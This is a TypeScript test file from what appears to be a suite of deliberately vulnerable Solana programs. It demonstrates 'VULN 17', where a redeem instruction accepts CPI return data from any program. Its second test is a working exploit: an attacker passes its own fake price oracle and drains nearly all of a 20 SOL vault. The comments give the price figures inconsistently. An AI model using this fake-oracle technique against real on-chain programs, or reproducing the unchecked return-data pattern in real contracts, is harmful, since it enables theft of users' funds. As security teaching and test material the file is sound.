/**
 * VULN 17 — trusting CPI return data without checking the source program.
 *
 * `redeem` CPIs `price_program` and accepts whatever `get_return_data()`
 * returns (only the length is checked, the program id is ignored). With the
 * honest oracle 1 lot = 0.001 SOL; the attacker's own contract (mode 7)
 * answers "2_000_000_000 lamports per lot" and redeems 10 lots for the
 * entire 20 SOL vault.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  solBalance, BN, LAMPORTS_PER_SOL,
} from "./util";

describe("vuln17 fake price oracle via return data", () => {
  const program = anchorProgram("vuln17_return_data", PROG_IDS.vuln17);
  const vault = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln17)[0];
  const creditsOf = (user: any) =>
    findPda([seedsBuf("credits")[0], user.publicKey.toBuffer()], PROG_IDS.vuln17)[0];

  let attacker: any, honest: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    honest = await newFundedKeypair();
    attacker = await newFundedKeypair();

    await program.methods.initialize()
      .accounts({ vault, payer: provider.wallet.publicKey })
      .rpc();
    // 20 SOL of honest redemption liquidity.
    await program.methods.fund(new BN(20 * LAMPORTS_PER_SOL))
      .accounts({ vault, user: provider.wallet.publicKey })
      .rpc();
  });

  it("honest redemption at the real oracle price (0.001 SOL per lot)", async () => {
    await program.methods.earn()
      .accounts({ credits: creditsOf(honest), user: honest.publicKey })
      .signers([honest]).rpc();

    const destBefore = await solBalance(honest.publicKey);
    await program.methods.redeem(new BN(2))
      .accounts({
        vault, credits: creditsOf(honest), user: honest.publicKey,
        priceProgram: PROG_IDS.oracle, destination: honest.publicKey,
      })
      .signers([honest]).rpc();

    // 2 lots * 1_000_000 lamports.
    assert.isAtLeast((await solBalance(honest.publicKey)) - destBefore, 2_000_000 - 10_000);
    const c = await program.account.credits.fetch(creditsOf(honest));
    assert.equal(c.lots.toString(), "8");
  });

  it("attacker's fake oracle inflates the price and drains the vault", async () => {
    await program.methods.earn()
      .accounts({ credits: creditsOf(attacker), user: attacker.publicKey })
      .signers([attacker]).rpc();

    const attackerBefore = await solBalance(attacker.publicKey);
    const vaultBefore = await solBalance(vault);

    await program.methods.redeem(new BN(10))
      .accounts({
        vault, credits: creditsOf(attacker), user: attacker.publicKey,
        priceProgram: PROG_IDS.attacker,   // <- THE BUG: any program can answer
        destination: attacker.publicKey,
      })
      .signers([attacker]).rpc();

    // 10 lots * 1_999_000_000 lamports = 19.99 SOL — the whole usable vault
    // (the honest redemption earlier left a 2-lamport-million residue).
    const gained = (await solBalance(attacker.publicKey)) - attackerBefore;
    assert.isAtLeast(gained, 19_990_000_000 - 20_000);
    assert.isBelow(await solBalance(vault), 10_000_000);

    const c = await program.account.credits.fetch(creditsOf(attacker));
    assert.equal(c.lots.toString(), "0");
  });
});
